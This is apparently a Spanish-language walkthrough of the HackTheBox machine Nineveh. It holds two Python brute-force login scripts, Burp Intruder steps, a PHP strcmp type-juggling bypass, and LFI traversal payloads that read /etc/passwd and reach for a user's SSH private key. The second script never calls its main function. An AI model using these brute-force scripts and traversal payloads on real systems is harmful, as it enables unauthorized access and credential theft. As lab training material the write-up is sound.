## Evaluacion de vulnerabilidades {-}

### Ataque de tipo intruder con burpsuite para el panel en el puerto 80 {-}

> [ ! ] NOTA: como ya hemos echo este tipo de ataque en la maquina **TheNotebook**, las imagenes que siguen corresponden a la maquina **TheNotebook**. La technica
es exactamente la misma, solo la IP y la url de las imagenes cambian.

1. Creamos un diccionario basado en el rockyou.txt

    ```bash
    cd content
    head -n 10000 /usr/share/wordlists/rockyou.txt > passwords
    ```

1. Desde burpsuite configuramos el scope hacia la url http://10.10.10.43
1. En firefox le ponemos el foxyproxy para el burpsuite
1. Lanzamos una peticion desde login con admin admin y la interceptamos con el burpsuite
1. En burpsuite le damos al `Ctrl+i` para enviarlo al intruder
1. Configuramos el attacker **Sniper** dando la posicion a la palabra password

    ```{r, echo = FALSE, fig.cap="nineveh sniper config", out.width="90%"}
    knitr::include_graphics("images/notebook-sniper-config.png")
    ```

1. Cargamos el diccionario creado a la payload list y le quitamos el Payload encoding

    ```{r, echo = FALSE, fig.cap="nineveh sniper payload list", out.width="90%"}
    knitr::include_graphics("images/notebook-sniper-list.png")
    ```

1. En Options creamos un regexp para saver cuando la contraseña es valida

    - en Grep - Extract damos a ADD
    - le damos a Fetch response y seleccionamos el campo invalid password

        ```{r, echo = FALSE, fig.cap="nineveh sniper fetch response", out.width="90%"}
        knitr::include_graphics("images/notebook-fetch-response.png")
        ```

1. Le damos a start attack

Aqui ya aparece la lista de todo los passwords que burp prueba y vemos una columna donde esta escrito `invalid password`.
lo dejamos un ratito y ya podemos ver que filtrando por esta columna vemos una linea donde no esta escrito esto. Ya tenemos la contraseña.

### Bruteforcear la contraseña con python {-}

Este seria la manera de hacer, lo que hemos echo con Burpsuite pero en python. El script nos viene del compañero s4dbrd.

```python
#!/usr/bin/python3

import requests
import pdb
import sys
import signal

from pwn import *

# Variables Globales
login_url = 'http://nineveh.htb/department/login.php'


f = open("rockyou.txt", "r")

def def_handler(sig, frame):
    print("\n\nSaliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def bruteForce():
 
    s = requests.Session()

    passwords = f.readlines()
      
    for password in passwords:
        

        login_data = {
            'username': 'admin',
            'password': password.rstrip()
        }

        p1.status("Probando con la contraseña %s" %password)
        r = s.post(login_url, data=login_data)
        
        if 'Invalid Password!' not in r.text:
            p1.success("La contraseña correcta es %s" %password)
            sys.exit(0)

if __name__ == '__main__':

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")
    time.sleep(2)

    bruteForce()
```

### Burlear el login panel con TypeJuggling {-}

Mas tarde en el video, el Tito nos muestra el codigo fuente de la pagina de login y se ve que en la comparativa del input **Password**, el
desarollador de la pagina utiliza un codigo php 

```php
if(isset($_POST['username'] == $USER){
    if(strcmp($_POST['password'], $PASS ) == 0){
        S_SESSION['username'] = $USER;
        header( 'Location: manage.php' );
    }
}
```

El problema aqui es que usado el comando `strcmp()` para el password permite al atacante de burlar esto con un cambio de tipo.

Si la request normal es como la siguiente y nos pone `incorrect password`

```bash
POST /login.php HTTP/1.1
Host: 10.10.10.10
User-Agent: ...
Cookie: PHPSESSID=o36osnz71uw900ln395jhs

username=admin&password=admin
```

cambiandole el payload de la siguiente manera nos loggea sin problema

```bash
POST /login.php HTTP/1.1
Host: 10.10.10.10
User-Agent: ...
Cookie: PHPSESSID=o36osnz71uw900ln395jhs

username=admin&password[]=a
```

El symbolo `[]` cambia el tipo de variable y el `strcmp()` lo acepta. 

### Ataque de tipo intruder con burpsuite para el panel en el puerto 443 {-}

Para el panel de authentification del **phpLiteAdmin**, utilizamos la misma tecnica que para el panel de authentification del puerto 80 (Burpsuite).
De esta manera tambien encontramos la contraseña y nos podemos conectar a la base de datos.

### Bruteforcear la contraseña con python {-}

Este seria la manera de bruteforcear la contraseña con python. Este Script tambien nos viene del compañero s4dbrd.

```python
#!/usr/bin/python3

import requests
import pdb
import sys
import signal
import urllib3


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from pwn import *

# Variables Globales
login_url = 'https://nineveh.htb/db/index.php'


f = open("rockyou.txt", "r")

def def_handler(sig, frame):
    print("\n\nSaliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def bruteForce():
 
    s = requests.Session()

    passwords = f.readlines()
      
    for password in passwords:
        

        login_data = {
            'password': password.rstrip(),
            'login': "Log+In",
            'proc_login': "true"
        }

        p1.status("Probando con la contraseña %s" %password)
        r = s.post(login_url, data=login_data, verify=False)
        
        if 'Incorrect password.' not in r.text:
            p1.success("La contraseña correcta es %s" %password)
            sys.exit(0)

if __name__ == '__main__':

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")
    time.sleep(2)
```

### Analizamos el panel de administracion del puerto 80 {-}

Aqui vemos un link llamado Notes, pinchamos y se ve una nota. 
Nos llama la atencion la url `10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt`
Intentamos ver si es vulnerable a un **LFI**

```bash
10.10.10.43/department/manage.php?notes=files/../../../../../../etc/passwd
10.10.10.43/department/manage.php?notes=files/../../../../../../etc/passwd%00
```

Aqui nos pone la pagina un mensaje `No notes selected`. Probamos mas cosas.

```bash
10.10.10.43/department/manage.php?notes=files/ninevehNotes
10.10.10.43/department/manage.php?notes=files/ninevehNote
```

La differentes respuestas nos hacen pensar que hay un systema de White words list que functionna unicamente si tenemos la palabra
**ninevehNotes**

```bash
10.10.10.43/department/manage.php?notes=files/ninevehNotes/../../../../../../etc/passwd
10.10.10.43/department/manage.php?notes=ninevehNotes/../../../../../../etc/passwd
10.10.10.43/department/manage.php?notes=/ninevehNotes/../etc/passwd
```

Ya podemos ver el contenido del `/etc/passwd` y vemos un usuario **amrois**

Miramos mas contenidos interresantes

### Checkeamos los puertos internos de la maquina {-}

Siempre es buena idea mirrar los puertos internos que estan abiertos. Desde fuera, connocemos los puertos 80 y 443.

1. Approvechamos del LFI para ver el fichero proc tcp

    ```bash
    10.10.10.43/department/manage.php?notes=files/ninevehNotes/../proc/tcp
    ```

1. copiamos esto en un fichero llamado data
1. recuperamos la columna que contiene los puertos

    ```bash
    cat data
    cat data | awk '{print $2}'
    cat data | awk '{print $2}' | grep -v "address"
    cat data | awk '{print $2}' | grep -v "address" | awk '{print $2}' FS=":"
    cat data | awk '{print $2}' | grep -v "address" | awk '{print $2}' FS=":" | sort -u
    ```

Aqui vemos 3 puertos en formato hexadecimal. Lo miramos con python

```python
python3

>>> 0x0016
22
>>> 0x0050
80
>>> 0x01BB
443
```

Ya sabemos ahora que hay el puerto 22 (ssh) que esta abierto internamente.


### Checkeamos las informaciones del usuario amrois {-}

```bash
10.10.10.43/department/manage.php?notes=files/ninevehNotes/../home/amrois/.ssh/id_rsa
10.10.10.43/department/manage.php?notes=files/ninevehNotes/../home/amrois/user.txt
```

No vemos nada. Vamos a ver lo que podemos hacer con la base de datos del puerto 443

### Analyzando la base de datos {-}

```bash
searchsploit phpliteadmin 1.9
```

Aqui vemos un exploit tipo Multiple Vulnerabilities y una Remote PHP Code Injection. Miramos el del RPCI

```bash
searchsploit -x 24044
```

Aqui vemos que si creamos una base de datos, el nombre que entramos sera seguido de la extension apropriada. Un atacante puede
crear una base de datos con una extension php y insertar PHP code para posteriorment ejecutarlo.
